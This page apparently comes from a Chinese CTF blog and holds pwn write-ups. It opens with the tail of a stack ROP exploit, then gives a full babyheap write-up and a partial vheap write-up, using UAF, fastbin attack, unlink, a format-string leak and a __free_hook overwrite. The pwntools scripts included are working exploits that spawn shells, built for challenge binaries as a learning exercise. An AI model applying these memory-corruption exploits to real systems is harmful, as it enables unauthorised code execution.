class="string">&quot;u&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401219</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)[::-<span class="number">1</span>]+p64(bss_addr-<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss_addr)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">puts_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&quot;puts&quot;</span>,puts_addr,libc)</span><br><span class="line">pop_rdx=<span class="number">0x0000000000001b92</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pop_rsi=<span class="number">0x00000000000202e8</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">execve=<span class="number">0x00000000000cc770</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/106694651">(whctf2017_stackoverflow ha1vk的博客-CSDN博客_whctf2017stackoverflow</a></p>
<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write#%E4%BB%BB%E6%84%8F%E5%86%99">IO FILE 之任意读写 « 平凡路上 (ray-cp.github.io)</a></p>
<p>[WHCTF 2017 note_sys | giantbranch’s blog](<a target="_blank" rel="noopener" href="https://www.giantbranch.cn/2017/12/11/WHCTF">https://www.giantbranch.cn/2017/12/11/WHCTF</a> 2017 note_sys&#x2F;)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/103089382">(44条消息) 攻防世界PWN之EasyPwn题解_ha1vk的博客-CSDN博客_pwn-sai_easy 解题思路</a></p>
<p><a target="_blank" rel="noopener" href="https://roderickchan.github.io/2022/04/15/BUUCTF-pwn-tasks-20/#whctf2017-rc4">BUUCTF-pwn合集 - Lynne’s House (roderickchan.github.io)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ebc85e8a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ebc85e8a.html" class="post-title-link" itemprop="url">wdb_2018_1st_babyheap</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/buu%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">buu刷题</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这道题的学习与总结有：</p>
<p>这道题考察的依然是利用UAF打unlink。unlink攻击的核心是可以伪造fake_chunk以及控制fake_chunk下面的堆块的chunk头。虽然无法直接溢出，但是我们可以做一个double free，然后打fastbin attack将chunk头申请出来(在低地址堆块中写入size，保证chunk头可以从fastbin上出来)，接着就可以打unlink了。</p>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220905195216743-36339851.png"></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序中就存在一个UAF漏洞(如下图)</p>
<p><img src="/../img/2706180-20220905195226020-1085425690.png"></p>
<p>同时限制了我们使用edit函数的次数为3次，限制了add函数的次数10次。最关键的是我们无法控制malloc出来堆块的大小，定死的size就是0x30。(如下图)</p>
<p><img src="/../img/2706180-20220905195236331-894639914.png"></p>
<p>然后下面自定义的输入函数也不存在off by one以及溢出。</p>
<p><img src="/../img/2706180-20220905195245678-421374853.png"></p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>因为我们malloc申请的堆块大小是固定的0x30字节的，这样我们就没法得到libc地址，我们必须想办法让堆块进入unsorted bin中，这样执行show函数才能获取libc地址。所以我们肯定是要利用double free+fastbin attack将chunk头申请出来去修改堆块的size。</p>
<p>在这之前我们需要获取堆地址，然后多垫几个堆块，保证修改之后，堆块地址加上自身size后依然可以找到下一个正确的堆块地址。因为我们要将chunk头申请出来，就意味着我们需要伪造一个size，去通过fastbin的检查。<strong>（edit函数用的时候要慎重，最后我们打unlink写入地址时就需要用掉两个edit函数的机会，所以我们前面的各种布局只能用一次edit函数，而且这次肯定还是要在fastin attack的时候用）</strong></p>
<p>然后我们下面放三种堆块布局，分别是正常的堆块A和堆块B，伪造size，申请chunk B head的布局，unlink时的堆块A和堆块B布局</p>
<p><strong>正常的堆块A和堆块B布局如下：</strong></p>
<p><img src="/../img/2706180-20220905195256837-2078069966.png"></p>
<p>因为<strong>我们想把chunk B head申请出来，因此我们需要伪造size</strong>，如下：</p>
<p>我解释一下这个图，首先我们是要控制chunk B head，因此我们先打一个double free+fastbin attack，将fake chunk（也就是黑色框中的部分）申请出来，这样我们往fake chunk中写入数据，就可以控制chunk B head了(将chunk B的size改成0xa0)，而在这之前我们需要在chunk A中的用户区写入0x31这个size(否则无法通过从fastbin中申请chunk的检查)</p>
<p><img src="/../img/2706180-20220905195309452-65115390.png"></p>
<p>上一步可以控制chunk B head后，我们把chunk B释放掉后，它就进入了unsorted bin中。同时别忘记unlink的条件，我们需要一个大于fastbin 范围的堆块作为引线堆块，所以释放这个chunk B的时候，我们还需要顺便打一个unlink。另外我们还需要布局一个fake chunk，这个fake chunk的size肯定要是0x20，因此我们需要修改下chunk A中的user data，但是我们不能再用edit函数了，所以这里采用的方法是释放掉chunk A，然后再申请回来，写入0x21这个size，同时还要写入ptr-0x18和ptr-0x10。</p>
<p><strong>最终的unlink时布局如下</strong>：</p>
<p><img src="/../img/2706180-20220905195319371-1640510939.png"></p>
<p>emmm，只要是熟悉unlink的师傅，应该都能看懂上面这个布局，最后提一下这个fake chunk是打fastbin attack强行错位申请出来的。<u>而为什么这个fake chunk的头必须要从0x603010开始，不能从0x603020开始？这是因为chunk B的地址是定死的，而它上面的内存单元必须是ptr-0x18和ptr-0x10，如果0x603020这个地址当做fake chunk head的话，那么0x603020这里应该是fake chunk的prev size，这样就不是ptr-0x18了，所以fake chunk必须在0x603010的地址开始。</u></p>
<p>然后打一个unlink，此时我们就可以控制bss段存放堆块的地址了，而此时我们还有两次执行edit函数的机会。由于我们在chunk B释放后执行show函数也得到了libc地址，因此我们直接用edit函数写一个free_hook的地址在bss段上，再edit函数往里写一个system的地址。最后free掉一个存有&#x2F;bin&#x2F;sh\x00字符串的堆块即可获取shell。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400D7D</span></span><br><span class="line">d_a=<span class="number">0x400D59</span></span><br><span class="line">d_e=<span class="number">0x400D65</span></span><br><span class="line">d_s=<span class="number">0x400D71</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25004&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment">#sleep(4)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">    add(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_addr=u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(heap_addr-<span class="number">0x20</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    </span><br><span class="line">    ptr=<span class="number">0x602060</span></span><br><span class="line">    add(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#debug(p,0x400C86,d_d,d_a,d_s,d_e,0x400BD9)</span></span><br><span class="line">    add(<span class="number">5</span>,p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=search_og(<span class="number">0</span>)+libc_base</span><br><span class="line">    free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_hook))</span><br><span class="line">    edit(<span class="number">0</span>,p64(sys_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220905195333982-307285379.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/b7f5642c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/b7f5642c.html" class="post-title-link" itemprop="url">vheap--pwnhub五月公开赛</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有:</p>
<p>1、本题的核心是劫持__free_hook。利用memcpy溢出，更改free状态堆块的fd指针，将其改写完__free_hook的地址，然后申请回来，写入system地址，最终free掉存有&#x2F;bin&#x2F;sh的堆块获取shell。</p>
<p>2、学会了新技能——使用IDA新建结构体，同时分析了IDA中的宏，通过对这个宏取字节的分析又加深了对指针的理解<br>3、使用sprintf的格式化字符串漏洞泄露数据时，要考虑到format在第二个参数的影响，最后的距离栈顶的偏移只加5（并不考虑rdi寄存器）</p>
<p>4、做的第一道堆题，体会到了在堆块中布局来获取shell的思想。</p>
<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略:"></a>保护策略:</h2><p><img src="/../img/2706180-20220514175612986-253149422.png"></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h2><h3 id="使用IDA创建结构体"><a href="#使用IDA创建结构体" class="headerlink" title="使用IDA创建结构体"></a>使用IDA创建结构体</h3><p>打开最后一个函数，发现懵懵逼逼的。</p>
<p><img src="/../img/2706180-20220514175619263-121762209.png"></p>
<p>请教了roderick师傅后才知道这里应该新建一个结构体进行分析，因为这里通过分析就是在取32位整数的四个字节（分析SBYTE1和SBYTE2、HIBYTE这几个宏观察出来的）。因为IDA生成伪代码的时候，并不能百分百的确认这是一个结构体，所以只能靠这种宏的形式展示出来，为了方便分析我们需要手动构造一个结构体。</p>
<p>首先创建结构体之前，必须要分析出来结构体里的成员数量和类型。</p>
<p>这个函数的形参是int类型的a1，而之后SBYTE2和HIBYTE、SBYTE1都是取的a1中的某一字节，因此猜测这个结构体是四个char类型的变量。</p>
<h4 id="创建结构体-方法1："><a href="#创建结构体-方法1：" class="headerlink" title="创建结构体 方法1："></a>创建结构体 方法1：</h4><p><img src="/../img/2706180-20220514175624982-2031282091.png"></p>
<p><img src="/../img/2706180-20220514182146085-26007685.png"></p>
<p>然后输入结构体的名字</p>
<p><img src="/../img/2706180-20220514180610163-205234172.png"></p>
<p>将光标点到ends上，然后按d</p>
<p><img src="/../img/2706180-20220514180637568-1730011386.png"></p>
<p>先创建四个变量，然后将光标点到field_0上，按n，重命名</p>
<p><img src="/../img/2706180-20220514180651445-1703543613.png"></p>
<p>最后将光标点到函数名上，按y，然后修改第二个红色框里的内容（改成结构体的名字，我这里是更改成value）</p>
<p><img src="/../img/2706180-20220514180703104-1762048814.png"></p>
<p>效果如下：</p>
<p><img src="/../img/2706180-20220514180712905-1869244594.png"></p>
<p>还有一种方法：</p>
<h4 id="创建结构体-方法2："><a href="#创建结构体-方法2：" class="headerlink" title="创建结构体 方法2："></a>创建结构体 方法2：</h4><p><img src="/../img/2706180-20220514180306157-2026482700.png" alt="image-20220513155653337"></p>
<p>然后右键插入</p>
<p><img src="/../img/2706180-20220514180305556-1203311905.png" alt="image-20220513155758601"></p>
<p>然后编辑结构体即可</p>
<p><img src="/../img/2706180-20220514180832544-593075132.png"></p>
<p>最后将原本的数据类型换成定义好的结构即可</p>
<p><img src="/../img/2706180-20220514180849983-205219515.png"></p>
<p><img src="/../img/2706180-20220514180901098-1038564234.png"></p>
<p>效果如下：</p>
<p><img src="/../img/2706180-20220514180915039-1521065964.png"></p>
<p>不过改完之后发现还是懵懵逼逼，因为还有个奇怪的qword_202D00不知道在干嘛。按x看一下交叉引用，发现了下面的代码</p>
<p><img src="/../img/2706180-20220514180927780-335719541.png"></p>
<p>这里看起来是在进行初始化，不过干啥用的还是懵懵逼逼。roderick师傅告诉我说，这里循环了16个次，回想起题目的名字是vheap（虚拟机堆题，这道题只模拟了寄存器和opcode），因此猜测这里是将所有的寄存器进行了初始化。因此我们将这个qword_202D68给重命名regs。</p>
<p>最后看起来舒服多了，分析着也比较方便。</p>
<p><img src="/../img/2706180-20220514180938745-1280833798.png"></p>
<h3 id="存在格式化字符串漏洞"><a href="#存在格式化字符串漏洞" class="headerlink" title="存在格式化字符串漏洞"></a>存在格式化字符串漏洞</h3><p><img src="/../img/2706180-20220514180947642-1290198064.png"></p>
<p>因为开了PIE，想实现任意写是够呛了，只能利用一次，而且没有准备好的跳板，因此猜测这里应该是用来泄露函数真实地址以来获取libc基地址的。</p>
<p>然后此处进行了一次输入</p>
<p><img src="/../img/2706180-20220514180959726-926685542.png"></p>
<p>最多输入2，接下来的循环最多跑三次，这个循环是从2020E0这里开始存一些数据。</p>
<p><img src="/../img/2706180-20220514181007362-1502659209.png"></p>
<p>这里输入一个不大于9的数字，然后循环会跑对应的次数，不过这里看着有点懵，不知道有啥用，那就继续往后分析。</p>
<p><img src="/../img/2706180-20220514181022124-806979207.png"></p>
<p>这个函数中的qword_202D78处于是bss段，存放的是0，通过循环每次+1，有点跟计数器一样，去不断的改变V1这个索引，来返回不同的值，索引是根据dword_202500找的，暂且记下，继续分析。</p>
<p>接下来就要分析最后的函数了。</p>
<p><img src="/../img/2706180-20220514180304098-1657473361.png" alt="image-20220513201827044"></p>
<p>先是这个if不是太好过，卡了我很久。</p>
<h3 id="分析取一字节宏的实现"><a href="#分析取一字节宏的实现" class="headerlink" title="分析取一字节宏的实现"></a>分析取一字节宏的实现</h3><p>这里换回原本的宏来说。就分析SBYTE1这一个宏吧。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">char</span>   int8;</span><br></pre></td></tr></table></figure>

<p>&amp;x 表示x的地址</p>
<p>(int8 *)&amp;x这个地址转换成char *类型，不过这个地址依然不变，变的仅仅是它的类型</p>
<p>*((int8 *)&amp;x+n)   +n代表在原本的地址上加n个内存单元的偏移，这个内存单元取决于什么？取决于指针指向的变量类型，因为被强转成了char *，因此现在的变量是char类型，所以+n就等同于x的地址+n字节，最终*取出指针对应的一字节的值。</p>
<p>为什么要强转成char *类型，不强转行不行？</p>
<blockquote>
<p>不行，强转成char *的目的是为了分别访问原本int类型变量的每个字节。不强转的话，+n就直接跳过了n个四字节的内存单元。</p>
</blockquote>
<p>因此得出结论SBYTE1的意思就是获取指定变量的第二字节（我是从低地址数的）。依次类推，SBYTE2就是获取第三字节，我们分别在结构体中把它们命名为two_byte、three_byte。</p>
<p>再拐过来看检查。</p>
<p><img src="/../img/2706180-20220514180303868-1305720818.png" alt="image-20220513214802748"></p>
<p>这个就是需要变量a1的第一字节和第三字节，要大于等于0 小于等于2。看下a1是什么？</p>
<p>一顿溯源之后，发现它就是qword_202500靠偏移得出来的值，再溯源一下，看看我们是否对这个qword_202500进行了输入</p>
<p><img src="/../img/2706180-20220514181132310-878458808.png"></p>
<p>下图中发现了，我们是可以控制dword_202500的值，因此这意味着我们可以控制输入的值的第一第三字节来绕过检查。</p>
<p><img src="/../img/2706180-20220514181144499-886432126.png"></p>
<p><img src="/../img/2706180-20220514180303512-502508280.png" alt="image-20220513215318327"></p>
<p><img src="/../img/2706180-20220514181203734-401889871.png"></p>
<p><img src="/../img/2706180-20220514180303249-943265363.png" alt="image-20220513215355579"></p>
<p>通过观察，发现了这三个核心函数，进入他们的条件就是控制第四字节的值即可。</p>
<h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路:"></a>大致思路:</h2><p>free函数执行后把指针给置空了，这里无法利用，那只能去观察memcpy函数了。观察memcpy函数的第一个参数，发现它和malloc返回的地址是一样的，这就意味着我们可以往&amp;unk_2020E0+64(__int64)a1.three_byte这个地址写入数据，然后复制给malloc中，可以复制0x40个字节，这里很明显存在溢出。</p>
<p>于是思路就是利用溢出修改当前chunk的下一个chunk(需要被free掉）的fd指针，然后我们再执行malloc时，是可以申请回来一个指定的地址。我们可以去修改__free_hook（free函数执行之前，会检查__free_hook，如果其值为NULL，则调用_int_free函数，否则调用__free_hook所指向的值）</p>
<p>申请回来之后，我们可以利用memcpy把system地址写入__free_hook所指向的地方。最后再把一个堆块里存入&#x2F;bin&#x2F;sh字符串，free掉这个堆块即可获取shell。</p>
<h2 id="调试来构建exp"><a href="#调试来构建exp" class="headerlink" title="调试来构建exp"></a>调试来构建exp</h2><p>首先我们要先尝试去绕过下面这个if检查，并且尝试执行一下malloc函数，其他的暂时先随便输入即可。</p>
<p><img src="/../img/2706180-20220514181218429-18861707.png"></p>
<p><img src="/../img/2706180-20220514180302997-106339106.png" alt="image-20220514090631642"></p>
<p>观察上面执行malloc的情况，这个要求我们的最高字节是10，才能执行malloc，然后第三字节决定了malloc的大小（two_byte是从低字节数的，第三字节是从高字节数的），然后这个把malloc这个地址记录在a1.one_byte偏移这里。</p>
<p>我们暂定申请0x10大小的chunk，然后将one_byte设置成0，那目前的exp应该为下面这个？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xec6)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;10001000&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">             </span><br></pre></td></tr></table></figure>

<p>可是运行一下发现，if的检查没有过去，出现了死循环。把第四行注释取消调试一下。</p>
<p><img src="/../img/2706180-20220514181236179-1811812982.png"></p>
<p>发现此时来到了if判断的地方，然后我们查看一下$rbp-0x24的值，发现末尾的是个什么玩意？989A68？ 这个肯定是过不了判断的。回想起现在看的是个十六进制的数字，我们用计算器转一下十进制看看。</p>
<p><img src="/../img/2706180-20220514181247254-599152087.png"></p>
<p>豁然开朗，<strong>因为我们输入的是十进制类型的数据，但是最后宏来取某个字节进行判断的时候，是对十六进制的数据进行操作的</strong>。因此为了绕过判断，我们要用十六进制的数据绕过，然后把其转换成十进制的数据输入。因此我们应该把10001000这个值改成a001000（a代表第四字节（我从低地址开始数的）设置成10为了执行malloc，第三字节的00，无所谓只要能绕过最开始的检查即可，第二字节的10代表的是malloc申请chunk的大小，第一字节的00相当于是unk_202060的索引，用来找到不同的堆块），然后转换成十进制输入。</p>
<p>所以最后的发送应该是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>目前我们已经掌握了绕过if的方法，接下来就是调试来布局了。首先我们要溢出，不过在此之前我们肯定是要申请两个堆块，然后free掉后申请的那个堆块，去执行memcpy来修改free掉堆块的fd指针，再malloc回来。</p>
<p>值得一提的是，memcpy复制的内容是在这里输入的，我们应该提前在这里布局一下。</p>
<p><img src="/../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p>
<h3 id="sprintf的格式化字符串漏洞"><a href="#sprintf的格式化字符串漏洞" class="headerlink" title="sprintf的格式化字符串漏洞"></a>sprintf的格式化字符串漏洞</h3><p>我们要将fd指针修改为__free_hook的地址，获取这个地址的前提是拿到libc基地址。此时就要用到前面的格式化字符串漏洞了，先看一下sprintf函数的执行情况。</p>
<p><img src="/../img/2706180-20220514180302267-1280701485.png" alt="image-20220514101654530"></p>
